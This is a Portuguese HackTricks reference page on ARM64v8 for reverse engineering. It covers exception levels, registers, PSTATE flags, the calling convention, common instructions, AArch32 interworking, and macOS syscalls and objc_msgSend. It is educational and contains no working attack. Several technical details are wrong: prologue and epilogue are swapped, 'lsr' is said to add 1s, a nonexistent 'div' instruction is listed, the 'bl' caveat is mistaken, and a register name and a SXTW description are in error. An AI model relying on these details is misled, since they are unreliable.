# Introdução à ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Níveis de Exceção - EL (ARM64v8)**

Na arquitetura ARMv8, os níveis de execução, conhecidos como Níveis de Exceção (ELs), definem o nível de privilégio e as capacidades do ambiente de execução. Existem quatro níveis de exceção, de EL0 a EL3, cada um servindo a uma finalidade diferente:

1. **EL0 - User Mode**:
- Este é o nível com menos privilégios e é usado para executar código de aplicações comuns.
- As aplicações executadas em EL0 são isoladas umas das outras e do software do sistema, aumentando a segurança e a estabilidade.
2. **EL1 - Operating System Kernel Mode**:
- A maioria dos kernels de sistemas operacionais é executada neste nível.
- EL1 tem mais privilégios que EL0 e pode acessar recursos do sistema, mas com algumas restrições para garantir a integridade do sistema. Você passa de EL0 para EL1 com a instrução SVC.
3. **EL2 - Hypervisor Mode**:
- Este nível é usado para virtualização. Um hypervisor executado em EL2 pode gerenciar vários sistemas operacionais (cada um em seu próprio EL1) executados no mesmo hardware físico.
- EL2 fornece recursos para isolamento e controle dos ambientes virtualizados.
- Assim, aplicações de máquinas virtuais como Parallels podem usar o `hypervisor.framework` para interagir com EL2 e executar máquinas virtuais sem precisar de extensões do kernel.
- Para passar de EL1 para EL2, a instrução `HVC` é usada.
4. **EL3 - Secure Monitor Mode**:
- Este é o nível com mais privilégios e é frequentemente usado para inicialização segura e ambientes de execução confiáveis.
- EL3 pode gerenciar e controlar acessos entre estados seguros e não seguros (como secure boot, trusted OS etc.).
- Era usado para KPP (Kernel Patch Protection) no macOS, mas não é mais usado.
- EL3 não é mais usado pela Apple.
- A transição para EL3 normalmente é feita usando a instrução `SMC` (Secure Monitor Call).

O uso desses níveis permite uma maneira estruturada e segura de gerenciar diferentes aspectos do sistema, desde aplicações de usuário até o software de sistema com mais privilégios. A abordagem da ARMv8 aos níveis de privilégio ajuda a isolar efetivamente os diferentes componentes do sistema, aumentando sua segurança e robustez.

## **Registradores (ARM64v8)**

ARM64 tem **31 registradores de uso geral**, identificados como `x0` a `x30`. Cada um pode armazenar um valor de **64 bits** (8 bytes). Para operações que exigem apenas valores de 32 bits, os mesmos registradores podem ser acessados em modo de 32 bits usando os nomes w0 a w30.

1. **`x0`** a **`x7`** - Normalmente usados como registradores temporários e para passar parâmetros para subrotinas.
- **`x0`** também carrega os dados de retorno de uma função
2. **`x8`** - No kernel Linux, `x8` é usado como o número da system call para a instrução `svc`. **No macOS, o usado é x16!**
3. **`x9`** a **`x15`** - Mais registradores temporários, frequentemente usados para variáveis locais.
4. **`x16`** e **`x17`** - **Intra-procedural Call Registers**. Registradores temporários para valores imediatos. Também são usados para chamadas indiretas de funções e stubs da PLT (Procedure Linkage Table).
- **`x16`** é usado como o **número da system call** para a instrução **`svc`** no **macOS**.
5. **`x18`** - **Platform register**. Pode ser usado como registrador de uso geral, mas em algumas plataformas é reservado para usos específicos da plataforma: ponteiro para o thread environment block atual no Windows ou para apontar para a **estrutura da task atualmente em execução no kernel Linux**.
6. **`x19`** a **`x28`** - São registradores preservados pelo callee. Uma função deve preservar os valores desses registradores para seu caller; por isso, eles são armazenados na stack e recuperados antes do retorno ao caller.
7. **`x29`** - **Frame pointer**, usado para acompanhar o stack frame. Quando um novo stack frame é criado porque uma função é chamada, o registrador **`x29`** é **armazenado na stack** e o endereço do novo frame pointer (o endereço de **`sp`**) é **armazenado neste registrador**.
- Este registrador também pode ser usado como um **registrador de uso geral**, embora normalmente seja usado como referência para **variáveis locais**.
8. **`x30`** ou **`lr`** - **Link register**. Armazena o **endereço de retorno** quando uma instrução `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) é executada, armazenando o valor de **`pc`** neste registrador.
- Também pode ser usado como qualquer outro registrador.
- Se a função atual for chamar uma nova função e, portanto, sobrescrever `lr`, ela o armazenará na stack no início; isso é o epílogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Armazena `fp` e `lr`, cria espaço e obtém o novo `fp`) e o recuperará no final; isso é o prólogo (`ldp x29, x30, [sp], #48; ret` -> Recupera `fp` e `lr` e retorna).
9. **`sp`** - **Stack pointer**, usado para acompanhar o topo da stack.
- O valor de **`sp`** deve sempre ser mantido com pelo menos **alinhamento** de **quadword**, caso contrário poderá ocorrer uma exceção de alinhamento.
10. **`pc`** - **Program counter**, que aponta para a próxima instrução. Esse registrador só pode ser atualizado por meio de geração de exceções, retornos de exceções e branches. As únicas instruções comuns que podem ler esse registrador são as instruções branch with link (BL, BLR), para armazenar o endereço de **`pc`** em **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Também chamado de **`wzr`** em sua forma de registrador de **32** bits. Pode ser usado para obter facilmente o valor zero (uma operação comum) ou para realizar comparações usando **`subs`**, como **`subs XZR, Xn, #10`**, armazenando os dados resultantes em nenhum lugar (em **`xzr`**).

Os registradores **`Wn`** são a versão de **32 bits** do registrador **`Xn`**.

> [!TIP]
> Os registradores X0 - X18 são voláteis, o que significa que seus valores podem ser alterados por chamadas de função e interrupções. Entretanto, os registradores X19 - X28 são não voláteis, o que significa que seus valores devem ser preservados entre chamadas de função ("callee saved").

### Registradores SIMD e de Ponto Flutuante

Além disso, existem outros **32 registradores de 128 bits** que podem ser usados em operações SIMD (single instruction multiple data) otimizadas e para realizar aritmética de ponto flutuante. Eles são chamados de registradores Vn, embora também possam operar em **64** bits, **32** bits, **16** bits e **8** bits; nesse caso, são chamados de **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.

### Registradores de Sistema

**Existem centenas de registradores de sistema**, também chamados de registradores de finalidade especial (SPRs), usados para **monitorar** e **controlar** o comportamento dos **processadores**.\
Eles só podem ser lidos ou definidos usando as instruções especiais dedicadas **`mrs`** e **`msr`**.

Os registradores especiais **`TPIDR_EL0`** e **`TPIDDR_EL0`** são encontrados com frequência durante reverse engineering. O sufixo `EL0` indica a **exceção mínima** a partir da qual o registrador pode ser acessado (neste caso, EL0 é o nível de exceção (privilégio) comum com o qual programas regulares são executados).\
Eles são frequentemente usados para armazenar o **endereço base da região de thread-local storage** da memória. Normalmente, o primeiro pode ser lido e escrito por programas executados em EL0, enquanto o segundo pode ser lido a partir de EL0 e escrito a partir de EL1 (como o kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contém vários componentes do processo serializados no registrador especial visível ao sistema operacional **`SPSR_ELx`**, sendo X o **nível de permissão** da exceção **disparada** (isso permite recuperar o estado do processo quando a exceção termina).\
Estes são os campos acessíveis:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Os flags de condição **`N`**, **`Z`**, **`C`** e **`V`**:
- **`N`** significa que a operação produziu um resultado negativo
- **`Z`** significa que a operação produziu zero
- **`C`** significa que a operação gerou carry
- **`V`** significa que a operação produziu um overflow com sinal:
- A soma de dois números positivos produz um resultado negativo.
- A soma de dois números negativos produz um resultado positivo.
- Na subtração, quando um número negativo grande é subtraído de um número positivo menor (ou vice-versa), e o resultado não pode ser representado dentro do intervalo do tamanho de bit fornecido.
- Obviamente, o processador não sabe se a operação tem sinal ou não, portanto verificará C e V nas operações e indicará se ocorreu um carry, caso ela seja com ou sem sinal.

> [!WARNING]
> Nem todas as instruções atualizam esses flags. Algumas, como **`CMP`** ou **`TST`**, fazem isso, assim como outras que possuem o sufixo s, como **`ADDS`**.

- O flag de **largura atual do registrador (`nRW`)**: Se o flag tiver o valor 0, o programa será executado no estado de execução AArch64 quando retomado.
- O **nível de exceção atual** (**`EL`**): Um programa regular executado em EL0 terá o valor 0
- O flag de **single stepping** (**`SS`**): Usado por debuggers para executar uma única instrução por vez, definindo o flag SS como 1 dentro de **`SPSR_ELx`** por meio de uma exceção. O programa executará uma instrução e emitirá uma exceção de single step.
- O flag de estado de **exceção ilegal** (**`IL`**): É usado para marcar quando um software privilegiado realiza uma transferência inválida de nível de exceção; esse flag é definido como 1 e o processador dispara uma exceção de estado ilegal.
- Os flags **`DAIF`**: Esses flags permitem que um programa privilegiado mascare seletivamente determinadas exceções externas.
- Se **`A`** for 1, significa que **aborts assíncronos** serão disparados. **`I`** configura a resposta a **Interrupts Requests** (IRQs) de hardware externo, e F está relacionado a **Fast Interrupt Requests** (FIRs).
- Os flags de **seleção do stack pointer** (**`SPS`**): Programas privilegiados executados em EL1 ou superior podem alternar entre o uso de seu próprio registrador de stack pointer e o usado pelo modelo de usuário (por exemplo, entre **`SP_EL1`** e **`EL0`**). Essa alternância é realizada escrevendo no registrador especial **`SPSel`**. Isso não pode ser feito a partir de EL0.

## **Calling Convention (ARM64v8)**

A calling convention ARM64 especifica que os **primeiros oito parâmetros** de uma função são passados nos registradores **`x0`** a **`x7`**. Parâmetros **adicionais** são passados na **stack**. O valor de **retorno** é passado no registrador **`x0`**, ou também em **`x1`** **se tiver 128 bits**. Os registradores **`x19`** a **`x30`** e **`sp`** devem ser **preservados** entre chamadas de função.

Ao ler uma função em assembly, procure o **prólogo e o epílogo da função**. O **prólogo** normalmente envolve **salvar o frame pointer (`x29`)**, configurar um **novo frame pointer** e **alocar espaço na stack**. O **epílogo** normalmente envolve **restaurar o frame pointer salvo** e **retornar** da função.

### Calling Convention em Swift

Swift possui sua própria **calling convention**, que pode ser encontrada em [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instruções comuns (ARM64v8)**

As instruções ARM64 geralmente possuem o **formato `opcode dst, src1, src2`**, em que **`opcode`** é a **operação** a ser realizada (como `add`, `sub`, `mov` etc.), **`dst`** é o registrador de **destino** onde o resultado será armazenado, e **`src1`** e **`src2`** são os registradores de **origem**. Valores imediatos também podem ser usados no lugar dos registradores de origem.

- **`mov`**: **Move** um valor de um **registrador** para outro.
- Exemplo: `mov x0, x1` — Move o valor de `x1` para `x0`.
- **`ldr`**: **Carrega** um valor da **memória** para um **registrador**.
- Exemplo: `ldr x0, [x1]` — Carrega em `x0` um valor do local de memória apontado por `x1`.
- **Modo offset**: Um offset que afeta o ponteiro de origem é indicado, por exemplo:
- `ldr x2, [x1, #8]`, carrega em x2 o valor de x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, carrega em x2 um objeto do array x0, na posição x1 (índice) \* 4
- **Modo pré-indexado**: Aplica cálculos à origem, obtém o resultado e também armazena a nova origem na origem.
- `ldr x2, [x1, #8]!`, carrega `x1 + 8` em `x2` e armazena em x1 o resultado de `x1 + 8`
- `str lr, [sp, #-4]!`, armazena o link register em sp e atualiza o registrador sp
- **Modo pós-indexado**: É como o anterior, mas o endereço de memória é acessado e depois o offset é calculado e armazenado.
- `ldr x0, [x1], #8`, carrega `x1` em `x0` e atualiza x1 com `x1 + 8`
- **Endereçamento relativo ao PC**: Nesse caso, o endereço a ser carregado é calculado em relação ao registrador PC
- `ldr x1, =_start`, carrega em x1 o endereço onde o símbolo `_start` começa, relativo ao PC atual.
- **`str`**: **Armazena** um valor de um **registrador** na **memória**.
- Exemplo: `str x0, [x1]` — Armazena o valor em `x0` no local de memória apontado por `x1`.
- **`ldp`**: **Load Pair of Registers**. Esta instrução **carrega dois registradores** de locais de memória **consecutivos**. O endereço de memória normalmente é formado adicionando um offset ao valor de outro registrador.
- Exemplo: `ldp x0, x1, [x2]` — Carrega `x0` e `x1` dos locais de memória em `x2` e `x2 + 8`, respectivamente.
- **`stp`**: **Store Pair of Registers**. Esta instrução **armazena dois registradores** em locais de memória **consecutivos**. O endereço de memória normalmente é formado adicionando um offset ao valor de outro registrador.
- Exemplo: `stp x0, x1, [sp]` — Armazena `x0` e `x1` nos locais de memória em `sp` e `sp + 8`, respectivamente.
- `stp x0, x1, [sp, #16]!` — Armazena `x0` e `x1` nos locais de memória em `sp+16` e `sp + 24`, respectivamente, e atualiza `sp` com `sp+16`.
- **`add`**: **Soma** os valores de dois registradores e armazena o resultado em um registrador.
- Sintaxe: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destino
- Xn2 -> Operando 1
- Xn3 | #imm -> Operando 2 (registrador ou imediato)
- \[shift #N | RRX] -> Realiza um shift ou chama RRX
- Exemplo: `add x0, x1, x2` — Soma os valores em `x1` e `x2` e armazena o resultado em `x0`.
- `add x5, x5, #1, lsl #12` — Isso equivale a 4096 (um 1 deslocado 12 vezes) -> 1 0000 0000 0000 0000
- **`adds`**: Realiza um `add` e atualiza os flags
- **`sub`**: **Subtrai** os valores de dois registradores e armazena o resultado em um registrador.
- Consulte a **sintaxe** de **`add`**.
- Exemplo: `sub x0, x1, x2` — Subtrai o valor de `x2` de `x1` e armazena o resultado em `x0`.
- **`subs`**: É como `sub`, mas atualiza o flag
- **`mul`**: **Multiplica** os valores de **dois registradores** e armazena o resultado em um registrador.
- Exemplo: `mul x0, x1, x2` — Multiplica os valores em `x1` e `x2` e armazena o resultado em `x0`.
- **`div`**: **Divide** o valor de um registrador por outro e armazena o resultado em um registrador.
- Exemplo: `div x0, x1, x2` — Divide o valor em `x1` por `x2` e armazena o resultado em `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Adiciona 0s no final, deslocando os outros bits para frente (multiplica por n vezes 2)
- **Logical shift right**: Adiciona 1s no início, deslocando os outros bits para trás (divide por n vezes 2 sem sinal)
- **Arithmetic shift right**: Como **`lsr`**, mas, em vez de adicionar 0s, se o bit mais significativo for 1, **1s são adicionados** (divide por n vezes 2 com sinal)
- **Rotate right**: Como **`lsr`**, mas tudo que é removido da direita é anexado à esquerda
- **Rotate Right with Extend**: Como **`ror`**, mas usando o carry flag como o "bit mais significativo". Assim, o carry flag é movido para o bit 31 e o bit removido vai para o carry flag.
- **`bfm`**: **Bit Field Move**; essas operações **copiam os bits `0...n`** de um valor e os colocam nas posições **`m..m+n`**. O **`#s`** especifica a posição do bit mais à esquerda e **`#r`**, a quantidade de rotação para a direita.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Copia um bitfield de um registrador e o copia para outro registrador.
- **`BFI X1, X2, #3, #4`** Insere 4 bits de X2 a partir do 3º bit de X1
- **`BFXIL X1, X2, #3, #4`** Extrai quatro bits de X2 a partir do 3º bit e os copia para X1
- **`SBFIZ X1, X2, #3, #4`** Faz sign-extend de 4 bits de X2 e os insere em X1 a partir da posição de bit 3, zerando os bits à direita
- **`SBFX X1, X2, #3, #4`** Extrai 4 bits a partir do bit 3 de X2, faz sign-extend deles e coloca o resultado em X1
- **`UBFIZ X1, X2, #3, #4`** Faz zero-extend de 4 bits de X2 e os insere em X1 a partir da posição de bit 3, zerando os bits à direita
- **`UBFX X1, X2, #3, #4`** Extrai 4 bits a partir do bit 3 de X2 e coloca o resultado com zero-extend em X1.
- **Sign Extend To X:** Estende o sinal (ou adiciona apenas 0s na versão sem sinal) de um valor para permitir realizar operações com ele:
- **`SXTB X1, W2`** Estende o sinal de um byte **de W2 para X1** (`W2` é metade de `X2`) para preencher os 64 bits
- **`SXTH X1, W2`** Estende o sinal de um número de 16 bits **de W2 para X1** para preencher os 64 bits
- **`SXTW X1, W2`** Estende o sinal de um byte **de W2 para X1** para preencher os 64 bits
- **`UXTB X1, W2`** Adiciona 0s (sem sinal) a um byte **de W2 para X1** para preencher os 64 bits
- **`extr`:** Extrai bits de um **par especificado de registradores concatenados**.
- Exemplo: `EXTR W3, W2, W1, #3` Isso irá **concatenar W1+W2** e obter **do bit 3 de W2 até o bit 3 de W1**, armazenando o resultado em W3.
- **`cmp`**: **Compara** dois registradores e define os flags de condição. É um **alias de `subs`**, definindo o registrador de destino como o zero register. Útil para verificar se `m == n`.
- Suporta a **mesma sintaxe de `subs`**
- Exemplo: `cmp x0, x1` — Compara os valores em `x0` e `x1` e define os flags de condição de acordo.
- **`cmn`**: Operando **Compare negative**. Nesse caso, é um **alias de `adds`** e suporta a mesma sintaxe. Útil para verificar se `m == -n`.
- **`ccmp`**: Comparação condicional; é uma comparação que só será realizada se uma comparação anterior for verdadeira e definirá especificamente os bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> se x1 != x2 e x3 < x4, salta para func
- Isso ocorre porque **`ccmp`** só será executado se o **`cmp` anterior for um `NE`**; caso contrário, os bits `nzcv` serão definidos como 0 (o que não satisfará a comparação `blt`).
- Isso também pode ser usado como `ccmn` (igual, mas negativo, como `cmp` versus `cmn`).
- **`tst`**: Verifica se algum dos valores da comparação é simultaneamente 1 (funciona como um ANDS sem armazenar o resultado em nenhum lugar). É útil para verificar um registrador com um valor e verificar se algum dos bits do registrador indicados no valor é 1.
- Exemplo: `tst X1, #7` Verifica se algum dos 3 últimos bits de X1 é 1
- **`teq`**: Operação XOR descartando o resultado
- **`b`**: Branch incondicional
- Exemplo: `b myFunction`
- Observe que isso não preencherá o link register com o endereço de retorno (não é adequado para chamadas de subrotinas que precisam retornar)
- **`bl`**: **Branch** with link, usado para **chamar** uma **subrotina**. Armazena o **endereço de retorno em `x30`**.
- Exemplo: `bl myFunction` — Chama a função `myFunction` e armazena o endereço de retorno em `x30`.
- Observe que isso não preencherá o link register com o endereço de retorno (não é adequado para chamadas de subrotinas que precisam retornar)
- **`blr`**: **Branch** with Link to Register, usado para **chamar** uma **subrotina** cujo destino é **especificado** em um **registrador**. Armazena o endereço de retorno em `x30`. (Isso é
- Exemplo: `blr x1` — Chama a função cujo endereço está contido em `x1` e armazena o endereço de retorno em `x30`.
- **`ret`**: **Retorna** de uma **subrotina**, normalmente usando o endereço em **`x30`**.
- Exemplo: `ret` — Retorna da subrotina atual usando o endereço de retorno em `x30`.
- **`b.<cond>`**: Branches condicionais
- **`b.eq`**: **Branch se igual**, com base na instrução `cmp` anterior.
- Exemplo: `b.eq label` — Se a instrução `cmp` anterior encontrou dois valores iguais, salta para `label`.
- **`b.ne`**: **Branch se diferente**. Essa instrução verifica os flags de condição (definidos por uma instrução de comparação anterior) e, se os valores comparados forem diferentes, salta para um label ou endereço.
- Exemplo: Após uma instrução `cmp x0, x1`, `b.ne label` — Se os valores em `x0` e `x1` forem diferentes, salta para `label`.
- **`cbz`**: **Compare and Branch on Zero**. Essa instrução compara um registrador com zero e, se forem iguais, salta para um label ou endereço.
- Exemplo: `cbz x0, label` — Se o valor em `x0` for zero, salta para `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Essa instrução compara um registrador com zero e, se forem diferentes, salta para um label ou endereço.
- Exemplo: `cbnz x0, label` — Se o valor em `x0` não for zero, salta para `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Exemplo: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Exemplo: `tbz x0, #8, label`
- **Conditional select operations**: São operações cujo comportamento varia dependendo dos bits condicionais.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Se verdadeiro, X0 = X1; se falso, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn; se falso, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Se verdadeiro, Xd = Xn + 1; se falso, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn; se falso, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Se verdadeiro, Xd = NOT(Xn); se falso, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn; se falso, Xd = - Xm
- `cneg Xd, Xn, cond` -> Se verdadeiro, Xd = - Xn; se falso, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = 1; se falso, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = \<all 1>; se falso, Xd = 0
- **`adrp`**: Calcula o **endereço da página de um símbolo** e o armazena em um registrador.
- Exemplo: `adrp x0, symbol` — Calcula o endereço da página de `symbol` e o armazena em `x0`.
- **`ldrsw`**: **Carrega** um valor **assinado de 32 bits** da memória e faz **sign-extend para 64** bits. Isso é usado em casos comuns de SWITCH.
- Exemplo: `ldrsw x0, [x1]` — Carrega um valor assinado de 32 bits do local de memória apontado por `x1`, faz sign-extend para 64 bits e armazena o resultado em `x0`.
- **`stur`**: **Armazena o valor de um registrador em um local de memória**, usando um offset de outro registrador.
- Exemplo: `stur x0, [x1, #4]` — Armazena o valor em `x0` no endereço de memória que está 4 bytes além do endereço atualmente em `x1`.
- **`svc`**: Realiza uma **system call**. Significa "Supervisor Call". Quando o processador executa essa instrução, ele **alterna do user mode para o kernel mode** e salta para um local específico da memória onde está localizado o código de **tratamento de system calls do kernel**.

- Exemplo:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Prólogo da função**

1. **Salvar o link register e o frame pointer na stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Configurar o novo frame pointer**: `mov x29, sp` (configura o novo frame pointer para a função atual)
3. **Alocar espaço na stack para variáveis locais** (se necessário): `sub sp, sp, <size>` (onde `<size>` é o número de bytes necessários)

### **Epílogo da função**

1. **Desalocar variáveis locais (se alguma tiver sido alocada)**: `add sp, sp, <size>`
2. **Restaurar o registrador de link e o frame pointer**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Retorno**: `ret` (retorna o controle ao chamador usando o endereço no registrador de link)

## Proteções Comuns de Memória do ARM

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## Estado de Execução AARCH32

Armv8-A oferece suporte à execução de programas de 32 bits. **AArch32** pode executar em um dos **dois conjuntos de instruções**: **`A32`** e **`T32`**, e pode alternar entre eles por meio de **`interworking`**.\
Programas de 64 bits **privileged** podem agendar a **execução de** programas de 32 bits executando uma transferência de nível de exceção para o nível inferior de 32 bits com menos privilégios.\
Observe que a transição de 64 bits para 32 bits ocorre com uma redução do nível de exceção (por exemplo, um programa de 64 bits em EL1 acionando um programa em EL0). Isso é feito definindo o **bit 4 de** **`SPSR_ELx`**, um registrador especial, **como 1** quando a thread do processo **AArch32** está pronta para ser executada, enquanto o restante de `SPSR_ELx` armazena o CPSR do programa **`AArch32`**. Em seguida, o processo privilegiado chama a instrução **`ERET`**, fazendo com que o processador faça a transição para **`AArch32`**, entrando em A32 ou T32 dependendo do CPSR**.**

O **`interworking`** ocorre usando os bits J e T do CPSR. `J=0` e `T=0` significam **`A32`**, enquanto `J=0` e `T=1` significam **T32**. Isso basicamente se traduz em definir o **bit menos significativo como 1** para indicar que o conjunto de instruções é T32.\
Isso é definido durante as **instruções de branch de `interworking`,** mas também pode ser definido diretamente com outras instruções quando o PC é definido como registrador de destino. Exemplo:

Outro exemplo:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registradores

Existem 16 registradores de 32 bits (r0-r15). **De r0 a r14**, eles podem ser usados para **qualquer operação**; no entanto, alguns deles geralmente são reservados:

- **`r15`**: Contador de programa (sempre). Contém o endereço da próxima instrução. Em A32, current + 8; em T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Registrador de chamada intra-procedural
- **`r13`**: Stack Pointer (observe que a stack está sempre alinhada a 16 bytes)
- **`r14`**: Link Register

Além disso, os registradores são armazenados em **`banked registries`**, que são locais que armazenam os valores dos registradores, permitindo realizar **trocas rápidas de contexto** no tratamento de exceções e em operações privilegiadas, evitando a necessidade de salvar e restaurar manualmente os registradores todas as vezes.\
Isso é feito **salvando o estado do processador do `CPSR` no `SPSR`** do modo do processador para o qual a exceção é direcionada. No retorno da exceção, o **`CPSR`** é restaurado a partir do **`SPSR`**.

### CPSR - Current Program Status Register

No AArch32, o CPSR funciona de forma semelhante ao **`PSTATE`** no AArch64 e também é armazenado em **`SPSR_ELx`** quando uma exceção é recebida, para restaurar posteriormente a execução:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Os campos são divididos em alguns grupos:

- Application Program Status Register (APSR): Flags aritméticas e acessível a partir do EL0
- Execution State Registers: Comportamento do processo (gerenciado pelo OS).

#### Application Program Status Register (APSR)

- As flags **`N`**, **`Z`**, **`C`**, **`V`** (assim como no AArch64)
- A flag **`Q`**: É definida como 1 sempre que ocorre **saturação de inteiros** durante a execução de uma instrução aritmética especializada de saturação. Depois de definida como **`1`**, ela mantém esse valor até ser manualmente definida como 0. Além disso, não existe nenhuma instrução que verifique implicitamente seu valor; isso deve ser feito lendo-a manualmente.
- Flags **`GE`** (Greater than or equal): São usadas em operações SIMD (Single Instruction, Multiple Data), como "parallel add" e "parallel subtract". Essas operações permitem processar vários pontos de dados em uma única instrução.

Por exemplo, a instrução **`UADD8`** **soma quatro pares de bytes** (a partir de dois operandos de 32 bits) em paralelo e armazena os resultados em um registrador de 32 bits. Em seguida, ela **define as flags `GE` no `APSR`** com base nesses resultados. Cada flag GE corresponde a uma das adições de bytes, indicando se a adição daquele par de bytes **causou overflow**.

A instrução **`SEL`** usa essas flags GE para realizar ações condicionais.

#### Execution State Registers

- Os bits **`J`** e **`T`**: **`J`** deve ser 0; se **`T`** for 0, o conjunto de instruções A32 será usado; se for 1, será usado o T32.
- **IT Block State Register** (`ITSTATE`): São os bits de 10-15 e 25-26. Eles armazenam condições para instruções dentro de um grupo prefixado por **`IT`**.
- Bit **`E`**: Indica o **endianness**.
- **Mode and Exception Mask Bits** (0-4): Determinam o estado atual de execução. O 5º indica se o programa é executado como 32-bit (1) ou 64-bit (0). Os outros 4 representam o **modo de exceção atualmente em uso** (quando ocorre uma exceção e ela está sendo tratada). O número definido **indica a prioridade atual** caso outra exceção seja acionada enquanto esta estiver sendo tratada.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Certas exceções podem ser desabilitadas usando os bits **`A`**, `I`, `F`. Se **`A`** for 1, isso significa que **aborts assíncronos** serão acionados. O **`I`** configura a resposta a **Interrupts Requests** (IRQs) de hardware externo, e o F está relacionado a **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Confira [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) ou execute `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls terão **x16 > 0**.

### Mach Traps

Confira em [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) a `mach_trap_table` e em [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) os protótipos. O número máximo de Mach traps é `MACH_TRAP_TABLE_COUNT` = 128. Mach traps terão **x16 < 0**; portanto, é necessário chamar os números da lista anterior com um **sinal de menos**: **`_kernelrpc_mach_vm_allocate_trap`** é **`-10`**.

Você também pode verificar **`libsystem_kernel.dylib`** em um disassembler para descobrir como chamar esses syscalls (e os BSD syscalls):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Observe que **Ida** e **Ghidra** também podem decompilar **dylibs específicas** do cache apenas passando o cache.

> [!TIP]
> Às vezes é mais fácil verificar o código **decompilado** de **`libsystem_kernel.dylib`** do que verificar o **código-fonte**, porque o código de vários syscalls (BSD e Mach) é gerado por meio de scripts (verifique os comentários no código-fonte), enquanto na dylib é possível encontrar o que está sendo chamado.

### chamadas machdep

O XNU oferece outro tipo de chamadas, chamadas de dependentes da máquina. Os números dessas chamadas dependem da arquitetura, e não há garantia de que nem as chamadas nem os números permanecerão constantes.

### página comm

Esta é uma página de memória pertencente ao kernel, mapeada no espaço de endereçamento do processo de cada usuário. Ela foi projetada para tornar a transição do modo de usuário para o kernel mais rápida do que usando syscalls para serviços do kernel utilizados com tanta frequência que essa transição seria muito ineficiente.

Por exemplo, a chamada `gettimeofdate` lê o valor de `timeval` diretamente da página comm.

### objc_msgSend

É muito comum encontrar essa função sendo usada em programas Objective-C ou Swift. Essa função permite chamar um método de um objeto Objective-C.

Parâmetros ([mais informações na documentação](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):<sup>[[4]](#references)</sup>

- x0: self -> Ponteiro para a instância
- x1: op -> Seletor do método
- x2... -> Restante dos argumentos do método invocado

Assim, se você definir um breakpoint antes do branch para essa função, poderá descobrir facilmente o que é invocado no lldb com (neste exemplo, o objeto chama um objeto de `NSConcreteTask` que executará um comando):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Ao definir a variável de ambiente **`NSObjCMessageLoggingEnabled=1`**, é possível registrar quando essa função é chamada em um arquivo como `/tmp/msgSends-pid`.
>
> Além disso, ao definir **`OBJC_HELP=1`** e chamar qualquer binary, você poderá ver outras variáveis de ambiente que pode usar para **registrar** quando determinadas ações do Objc-C ocorrem.

Quando essa função é chamada, é necessário encontrar o método chamado da instância indicada. Para isso, várias buscas são realizadas:

- Executar uma busca otimista no cache:
